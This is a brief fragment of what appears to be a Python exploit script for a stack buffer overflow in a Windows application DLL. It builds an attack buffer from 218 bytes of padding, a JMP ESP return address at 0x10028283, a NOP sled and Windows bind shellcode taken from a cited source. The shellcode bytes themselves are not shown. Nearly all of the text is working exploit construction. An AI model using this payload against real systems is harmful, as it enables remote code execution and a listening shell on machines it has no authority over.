...
# Windows bind shellcode from 
https://www.example.com/p/w32-bind-ngs-shellcode/
...
# JMP ESP at 10028283 C:\Program Files\PMSystem\Temp\tmp0.dll 
(Universal)
buf = "A" * 218 + struct.pack("<I", 0x10028283) + "\x90" * 37 + 
shellcode
